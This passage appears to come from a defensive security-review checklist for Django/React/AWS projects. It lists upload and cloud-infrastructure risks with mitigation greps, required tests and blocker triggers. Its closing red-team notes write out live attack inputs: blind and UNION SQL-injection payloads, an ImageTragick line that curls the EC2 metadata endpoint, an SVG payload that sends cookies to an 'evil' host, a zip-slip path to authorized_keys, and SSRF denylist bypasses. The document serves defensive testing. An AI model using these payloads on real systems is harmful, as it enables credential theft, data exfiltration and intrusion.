Routed on any phase touching `ImageField`/`FileField`, Pillow/`PIL`/Wand/ImageMagick/`ffmpeg`, upload `parser_classes`, avatar/thumbnail/attachment endpoints, or a React upload widget. A test that accepts a STORED success on a malicious payload (`assert r.status_code in (200,201,400)`, or asserts only `400` while the row was created) is graded OPEN — the test must assert the file was REJECTED AND not persisted AND not processed.

**Cat A12a: Decompression bomb / pixel-flood DoS** (BLOCKER)
- Threat: tiny file declares enormous dimensions → Pillow allocates `w*h*channels` on `.load()`/`.thumbnail()`/`.convert()` → multi-GB RSS → OOM-kill. Also animated GIF/WEBP frame-flood, TIFF strip-count abuse.
- Mitigation grep: `Image\.MAX_IMAGE_PIXELS\s*=` finite (NOT `= None` — `MAX_IMAGE_PIXELS\s*=\s*None` is itself OPEN); explicit cap from `img\.size`/`width`/`height` compared (`>\s*MAX_(WIDTH|HEIGHT|DIM)`) BEFORE any `\.load\(|\.thumbnail\(|\.convert\(|\.save\(|\.resize\(`; `ImageFile\.LOAD_TRUNCATED_IMAGES` NOT `True`; `FILE_UPLOAD_MAX_MEMORY_SIZE`/`DATA_UPLOAD_MAX_MEMORY_SIZE` present.
- Test grep: `test_decompression_bomb_rejected_before_load`, `test_oversize_dimensions_rejected` — small-bytes/huge-dimension file → `400`/`413` AND `Model.objects.count()` unchanged AND `.load()`/`.thumbnail()` never reached.
- BLOCKER trigger: image opened/resized with NO finite `MAX_IMAGE_PIXELS` AND NO pre-`.load()` dimension check; OR `MAX_IMAGE_PIXELS = None`; OR `LOAD_TRUNCATED_IMAGES = True` on attacker file; OR no bomb test exists.

**Cat A12b: ImageTragick-class delegate/coder RCE & coder SSRF** (BLOCKER)
- Threat: ImageMagick (`convert`/Wand) processes attacker MVG/MSL or `ephemeral:`/`url:`/`https:`/`text:`/`label:`/`msl:` coder → command exec (CVE-2016-3714) or SSRF via `url:` coder hitting `169.254.169.254` (links to Cat A1/A13.1). ffmpeg HLS/`concat:`/`subfile:` playlist SSRF + local-file read; GhostScript `-dSAFER` bypass.
- Mitigation grep: prefer Pillow; if ImageMagick, `policy.xml` locked — `<policy domain="coder" rights="none" pattern="(MVG|MSL|EPHEMERAL|URL|HTTPS|HTTP|TEXT|LABEL|PS|EPS|PDF|XPS|SHOW|WIN|PLT)"` + `<policy domain="delegate" rights="none"`; coder forced (`format='png'`); NO unsanitized filename into `subprocess.run([...convert`/`shell=True`; ffmpeg with restricted `-protocol_whitelist` + `-safe 1`; magic-byte sniff gates real content-type BEFORE any external processor.
- Test grep: `test_imagemagick_url_coder_blocked`, `test_ffmpeg_protocol_whitelist`, `test_policy_xml_locks_dangerous_coders` — upload MVG/MSL or `url:http://169.254.169.254/...`; assert ZERO outbound request (mocked), no shell-out, 400.
- BLOCKER trigger: ImageMagick/Wand/`convert`/`ffmpeg` on attacker media with NO `policy.xml` lockdown OR NO `-protocol_whitelist` OR `shell=True`/interpolated filename; OR `url:`/`http(s):` coder reaches network with no SSRF guard.

**Cat A12c: EXIF / metadata PII leak & metadata-borne payload** (BLOCKER if served publicly)
- Threat: photos retain EXIF GPS/serial/owner → PII disclosed on download; EXIF/IPTC/XMP smuggles XSS/SQL consumed downstream.
- Mitigation grep: metadata stripped on ingest — `image\.getexif\(\)` cleared, save WITHOUT `exif=`/`icc_profile=`, `piexif\.remove`, or full re-encode discarding original bytes; EXIF never echoed unescaped.
- Test grep: `test_exif_gps_stripped_on_upload`, `test_metadata_not_reflected` — upload JPEG with known GPS, re-download, assert no GPS/serial tags remain.
- BLOCKER trigger: user images served to others (avatars/gallery) with EXIF NOT stripped and NO re-encode.

**Cat A12d: Polyglot / content-type confusion / SVG stored-XSS** (BLOCKER)
- Threat: file valid as JPEG + HTML/JS (GIFAR, JPEG+trailing `<script>`), or `.svg` with `<script>`/`onload`/`<foreignObject>`, served from APP ORIGIN with wrong/sniffed content-type → stored XSS. Relies on MIME sniffing + trusting client `Content-Type`/extension.
- Mitigation grep: content-type from magic bytes (`python-magic`/`filetype.guess`), NOT `request.FILES[...].content_type`/extension; SVG rejected or sanitized (`bleach`/`defusedxml`) AND served `Content-Disposition: attachment` + `Content-Type: application/octet-stream`; ALL media carry `X-Content-Type-Options: nosniff` (`SECURE_CONTENT_TYPE_NOSNIFF = True`); media served from a sandboxed domain/CDN, NOT app origin; React `accept=` re-validated server-side.
- Test grep: `test_svg_upload_served_as_attachment`, `test_polyglot_jpeg_html_rejected`, `test_uploaded_media_has_nosniff`.
- BLOCKER trigger: SVG/HTML-renderable served inline from app origin; OR content-type trusted from client; OR served media lack `nosniff`.

**Cat A12e: Archive bombs & zip-slip on any extract path** (BLOCKER for extract endpoints)
- Threat: extracted upload is zip-slip (`../../etc/cron.d/x` member → write outside dir → RCE) or archive bomb (42.zip ~4.5 PB / high-ratio flat → disk/OOM DoS); tar symlink member → arbitrary overwrite.
- Mitigation grep: every member name validated — `os\.path\.realpath`/`Path\.resolve\(\)` checked `startswith`/`is_relative_to` target dir BEFORE write (NO bare `zip\.extractall\(`/`tar\.extractall\(`; `tarfile` `filter='data'` on 3.12+); per-member + total-extracted size cap, member-count cap, nesting depth limit; symlink members rejected (`member\.issym\(\)`/`islnk\(\)`).
- Test grep: `test_zip_slip_path_traversal_blocked`, `test_archive_expansion_ratio_capped`.
- BLOCKER trigger: `extractall(`/`unpack_archive(` on attacker archives with NO per-member path check, NO size/ratio cap, OR NO symlink rejection.

**Cat A12f: No server-side re-encode boundary** (WARN→OPEN, escalates A12a–d)
- Threat: original bytes stored/served verbatim → every "re-encode discards malicious bytes" mitigation is bypassed; stored file is still a bomb/polyglot/EXIF-leaker.
- Mitigation grep: ingest re-encodes to canonical (`Image\.open\(upload\)\.convert\("RGB"\)\.save\(new_buffer, format="JPEG"\)`) and persists the NEW buffer (NOT raw `request.FILES['x']`); thumbnail derived from re-encoded canonical.
- Test grep: `test_uploaded_image_reencoded_not_stored_verbatim` — upload file with trailing-payload, assert stored bytes differ + payload gone.
- BLOCKER trigger: raw upload bytes stored AND served with none of A12a/c/d present (re-encode is the cheapest single control closing the whole family).

## Cat A13: AWS Cloud-Infra Attack Surface

**Why insufficient:** the 9-cat catalog is entirely application-layer. The ONLY AWS token in the whole SDK is `release-framework-selector.md:91` (boto3 for Bedrock). No IMDS/SSRF-to-cred check, no IaC surface read at all (`terraform/*.tf`, `serverless.yml`, `cdk/`, `.env` never globbed), no AWS key-shape grep (`AKIA…`), no boto3 misuse model, no subdomain-takeover concept.

> **EVIDENCE MODEL — critical distinction.** Sub-cats marked **[IaC/CSPM static]** CANNOT be proven by a pytest (no runtime to assert against). Evidence is a passing `check_*` static gate over `terraform/*.tf`, `serverless.yml`, `cdk/`, policy JSON, `settings.py`, `.env` (tfsec/checkov/conftest/CI grep). Sub-cats marked **[pytest]** are runtime tests against boto3-calling Django code. A sub-cat with NO IaC and NO test = OPEN/BLOCKER. The current catalog's "require a passing test" model literally cannot express the IaC half — this is a structural addition, not just new categories.

Scope expands beyond `backend/apps/{feature}/` to `terraform/`, `serverless.yml`, `cdk/`, `infra/`, `.env*`, `settings.py`, any `boto3.client(`/`boto3.resource(`, and the built frontend `dist/`.

**Cat A13.1: SSRF → IMDS Credential Theft (EC2/ECS role exfil)** **[pytest + IaC]** — *the canonical AWS breach chain (Capital One)*
- Threat: user-controlled fetch reaches `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` (or ECS `169.254.170.2`) → temporary role creds → full IAM identity. IMDSv1 = single unauthenticated GET; IMDSv2 + `HttpPutResponseHopLimit=1` blocks proxied SSRF.
- Mitigation grep (egress allowlist): outbound helper blocks link-local — `re.match.*(169\.254|metadata|fd00:ec2)`, denylist `169\.254\.169\.254`/`169\.254\.170\.2`/`100\.100\.100\.200`, DNS resolved before connect (no rebind TOCTOU).
- Mitigation grep (IaC): launch template/ASG has `metadata_options { http_tokens = "required"` AND `http_put_response_hop_limit = 1`; container egress SG blocks `169.254.0.0/16`.
- Test grep: `test_imds_v2_enforced`, `test_ssrf_blocks_link_local_169_254`, `test_outbound_fetch_rejects_metadata_endpoint` — URL/Host/redirect target = `169.254.169.254` (and DNS-rebind variant) refused 400 BEFORE socket connect.
- Static check: `check_imds_v2_required` (`http_tokens` absent/`"optional"` ⇒ FAIL), `check_egress_blocks_imds`.
- BLOCKER trigger: outbound fetch on user URL with NO link-local denylist, OR any `aws_instance`/launch template with `http_tokens != "required"` (IMDSv1 reachable). Either alone = OPEN.

**Cat A13.2: S3 Bucket Misconfiguration (public exposure)** **[IaC/CSPM static]**
- Threat: bucket readable/listable/writable by world; objects served as attacker content. `BlockPublicAcls=false`, policy `Principal:"*"`, ACL `public-read*`, no public-access-block, no default SSE.
- Mitigation grep: every `aws_s3_bucket` paired with `aws_s3_bucket_public_access_block` all four `= true`; `aws_s3_bucket_server_side_encryption_configuration` present; no `acl = "public-read"`; policy `"Principal"\s*:\s*"\*"` ⇒ FAIL unless conditioned on `aws:SourceArn`/`aws:SourceVpce`/CloudFront-OAC.
- Static check: `check_s3_bucket_blocks_public_access`, `check_s3_default_encryption_enabled`, `check_no_public_read_acl`, `check_no_wildcard_principal_on_bucket_policy`.
- BLOCKER trigger: bucket with `Principal:"*"` unconditioned, OR `block_public_acls != true`/missing public-access-block, OR canned `public-read*` on user-data bucket.

**Cat A13.3: Presigned URL & User-Controlled S3 Key Abuse** **[pytest]**
- Threat: (a) `generate_presigned_url` with hours/days `ExpiresIn` → long-lived capability; (b) no `ContentType`/`ContentLength` lock on presigned PUT → upload `text/html` served via CloudFront = stored XSS; (c) S3 key from request input (`Key=f"uploads/{user_input}"`) → `../` path traversal / cross-tenant overwrite.
- Mitigation grep: `generate_presigned_url\(` with bounded `ExpiresIn` (≤ ~900s) + PUT pins `Params={'ContentType':..., 'ContentLength'...}` or POST policy with content-length-range/content-type conditions; key sanitized (`os.path.basename`, UUID rename, `safe_join`); no `Key=f"...{request`/`Key=...+ request`.
- Test grep: `test_presigned_url_expiry_bounded`, `test_presigned_put_locks_content_type`, `test_s3_key_rejects_path_traversal`, `test_s3_key_scoped_to_tenant_prefix`.
- BLOCKER trigger: presigned PUT with no ContentType lock AND objects fronted by CloudFront, OR S3 `Key` from request data with no `..`/basename sanitization.

**Cat A13.4: IAM Over-Permission & PassRole** **[IaC/CSPM static]**
- Threat: app/task/Lambda role over-permitted → SSRF/RCE becomes account takeover. `Action:"*"`, `Resource:"*"`, `iam:PassRole` to `Resource:"*"` (pass any role to a controlled service = escalation), `AdministratorAccess` on web-facing role.
- Mitigation grep: no `"Action"\s*:\s*"\*"`, no `"Action"\s*:\s*"(s3|iam|sts|ec2):\*"` on a runtime role, no `"Resource"\s*:\s*"\*"` with mutating actions, no `iam:PassRole` without ARN allowlist + `iam:PassedToService` condition, no `arn:aws:iam::aws:policy/AdministratorAccess` on app/task role.
- Static check: `check_no_wildcard_iam_action`, `check_no_wildcard_resource_on_mutating_action`, `check_passrole_is_scoped`, `check_app_role_not_admin`.
- BLOCKER trigger: runtime role with `Action:"*"` or `AdministratorAccess`, OR `iam:PassRole` with `Resource:"*"`.

**Cat A13.5: Hardcoded / Long-Lived AWS Credentials** **[pytest + static]**
- Threat: static `AKIA…` keys committed / in `settings.py`/`.env` / shipped in React bundle (`VITE_AWS_SECRET…`), never rotated. The existing React Cat 5 grep does NOT match the AWS key shape.
- Mitigation grep (source-wide incl. bundle): no `AKIA[0-9A-Z]{16}` / `ASIA[0-9A-Z]{16}`, no `aws_secret_access_key\s*[:=]\s*['"][A-Za-z0-9/+=]{40}`, no `AWS_SECRET_ACCESS_KEY\s*=\s*["'][^"']` literal in `settings.py`. Creds from instance/task role (`boto3.client('s3')` no key args) or Secrets Manager/SSM at runtime. Frontend: no `VITE_AWS_`/`VITE_.*SECRET_ACCESS_KEY`.
- Test grep: `check_no_hardcoded_aws_keys` (gitleaks on `AKIA[0-9A-Z]{16}`), `test_settings_reads_aws_creds_from_role_or_secrets_manager`, `check_frontend_bundle_has_no_aws_secret` (grep built `dist/`).
- BLOCKER trigger: any `AKIA[0-9A-Z]{16}` or 40-char secret in tracked files or bundle. Always OPEN.

**Cat A13.6: Secrets Management (no Secrets Manager/SSM, no rotation)** **[IaC/static]**
- Threat: DB passwords/API keys/JWT signing keys plaintext in env/`.env`/Lambda env-vars/Terraform `variable` defaults; no rotation; Lambda env vars exposed to `lambda:GetFunctionConfiguration`.
- Mitigation grep: secrets via `secretsmanager.get_secret_value`/`ssm.get_parameter(...,WithDecryption=True)`/`aws_secretsmanager_secret`; Terraform `variable` `sensitive = true` no plaintext `default`; no secret literals in `aws_lambda_function { environment { variables }}`.
- Static check: `check_secrets_from_secrets_manager_or_ssm`, `check_no_plaintext_secret_in_lambda_env`, `check_secret_rotation_enabled`.
- BLOCKER trigger: DB/master credential as plaintext Terraform `default` or Lambda env-var literal.

**Cat A13.7: Public Datastore & Open Security Groups** **[IaC/CSPM static]**
- Threat: RDS/Elasticache/OpenSearch publicly reachable or SG ingress `0.0.0.0/0` on 5432/3306/6379/22; `publicly_accessible = true`.
- Mitigation grep: no `ingress` with `cidr_blocks = ["0.0.0.0/0"]` on non-443/80 ports; `aws_db_instance` `publicly_accessible = false`, in private subnet, `storage_encrypted = true`.
- Static check: `check_no_sg_ingress_0_0_0_0_on_db_ports`, `check_rds_not_publicly_accessible`, `check_rds_storage_encrypted`, `check_no_open_ssh_0_0_0_0`.
- BLOCKER trigger: SG ingress `0.0.0.0/0` to DB/SSH port, OR `publicly_accessible = true` on RDS.

**Cat A13.8: SNS/SQS Message-Layer Abuse** **[pytest + IaC]**
- Threat: (a) SNS HTTP subscription auto-confirms by fetching `SubscribeURL` from POST body → SSRF + attacker subscribes/forges; no signature + cert-host (`*.amazonaws.com`) + SignatureVersion verify → spoofed notifications. (b) SNS/SQS policy `Principal:"*"` → unauthenticated `Publish`/`SendMessage`. (c) No DLQ / no idempotency → poison-message replay.
- Mitigation grep: SNS handler verifies signature (cert-host allowlist `^https://sns\.[a-z0-9-]+\.amazonaws\.com/` + SHA1withRSA) BEFORE acting; `SubscribeURL` fetched only after host-allowlist (ties to A13.1); IaC policy no `Principal:"*"` without `aws:SourceArn`; queue has `redrive_policy` (DLQ) + consumer dedupes on `MessageId`.
- Test grep: `test_sns_subscription_url_host_allowlisted`, `test_sns_message_signature_verified`, `test_sns_handler_rejects_spoofed_notification`, `check_no_wildcard_principal_on_sns_sqs`, `test_sqs_consumer_idempotent`.
- BLOCKER trigger: SNS HTTP subscription confirmer fetching `SubscribeURL` with no host allowlist (SSRF), OR SNS/SQS policy `Principal:"*"` allowing `Publish`/`SendMessage` unconditioned.

**Cat A13.9: Subdomain Takeover (dangling DNS)** **[IaC/static]**
- Threat: Route53 CNAME/ALIAS points at a deprovisioned S3-website/CloudFront/ELB/Beanstalk target; attacker re-registers it → serves content on your subdomain (cookie theft, OAuth-redirect hijack).
- Mitigation grep: every `aws_route53_record` ALIAS/CNAME target is a resource managed in the same Terraform state (interpolated `aws_s3_bucket.*.website_endpoint`/`aws_cloudfront_distribution.*.domain_name`/`aws_lb.*.dns_name`), not a hardcoded string.
- Static check: `check_route53_targets_are_managed_resources`, `check_no_dangling_cname`.
- BLOCKER trigger: Route53 record whose target is a literal `*.s3-website*`/`*.cloudfront.net`/`*.elb.amazonaws.com` with no corresponding live resource in state.

**Cat A13.10: CloudFront / Edge Origin Bypass & Email Spoofing** **[IaC/static]**
- Threat: (a) CloudFront origin (S3/ALB) ALSO directly reachable (no OAC/OAI, no custom-header+WAF) → bypass WAF/geo/rate; missing `viewer_protocol_policy = redirect-to-https`. (b) SES domain with no SPF/DKIM/DMARC → spoofed password-reset phish. (c) KMS key policy `Principal:"*"`/`kms:*`.
- Mitigation grep: `aws_cloudfront_origin_access_control` (OAC) attached AND S3 policy restricts `Principal` to that OAC ARN; `viewer_protocol_policy` not `allow-all`; WAF web ACL associated; SES `aws_ses_domain_dkim` + Route53 SPF TXT + DMARC `_dmarc` TXT (`p=quarantine|reject`); KMS policy no `Principal:"*"` with `kms:*`.
- Static check: `check_cloudfront_uses_oac`, `check_origin_not_directly_reachable`, `check_cloudfront_https_only`, `check_waf_associated`, `check_ses_spf_dkim_dmarc_present`, `check_kms_key_policy_not_wildcard`.
- BLOCKER trigger: CloudFront S3 origin with public-read bucket and no OAC, OR KMS key policy `Principal:"*"`+`kms:*`, OR password-reset email domain with no DMARC `p=reject|quarantine`.

### Red-team exploitation notes (grounds the test signatures)

**SQLi:** raw sinks live on READ paths far more than writes — search endpoints, hand-built `?ordering=`, report views with `.raw()`. ORDER BY is the easiest win the current grep misses entirely: `?sort=(SELECT CASE WHEN (SELECT substr(password,1,1) FROM auth_user WHERE id=1)='a' THEN id ELSE name END)` flips page order per true/false — leaks the hash char-by-char with zero quote, zero error. UNION exfil: `' ORDER BY N--` to find column count, type-match (`UNION SELECT NULL,email,NULL FROM auth_user--`), read out the body. Stacked needs the `cursor.execute()` path (psycopg runs multiple statements; `.raw()` does not) — seed a sentinel, attack, assert it survives. Second-order is the trap that makes status-201 a lie: register username `admin'--` (stored, 201, today PASSES), fires later when a report does `cursor.execute(f"...WHERE author='{stored}'")`.

**Image-DoS:** craft a ~6 KB PNG with IHDR 64000×64000 → ~12 GB RSS on `.load()`. ImageTragick MVG: `fill 'url(https://x"|curl 169.254.169.254/latest/meta-data/iam/...)'` turns ImageMagick into an SSRF client at the EC2 IMDS (chains to A13.1). SVG stored-XSS: `<svg onload="fetch('//evil/?c='+document.cookie)"/>` served inline from app origin runs in-session. Zip-slip member `../../../../home/app/.ssh/authorized_keys`. The meta-exploit: if the server stores/serves the exact uploaded bytes, every payload survives to download — re-encode (open→convert→save fresh buffer) is the single highest-leverage control.

**AWS:** the #1 real breach is SSRF→IMDS→role creds→lateral. Any user-URL fetch → `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` for `{AccessKeyId,SecretAccessKey,Token}`; ECS variant `169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`. Bypass naive denylists with DNS rebinding, decimal IP (`http://2852039166/`), or an open redirect on an allowlisted host. IMDSv2 + `HttpPutResponseHopLimit=1` stops the token PUT from being proxied. Over-permission (A13.4) compounds: stolen low-priv creds + `iam:PassRole Resource:*` = pass an admin role to a service you invoke = account takeover. `git log -p | grep AKIA` and scanning `dist/`/source-maps for `AKIA[0-9A-Z]{16}` is step zero. **Every AWS test must assert the BLOCKING condition (creds NOT returned / request refused pre-connect / static gate fails the build), never that the happy path 200s.**
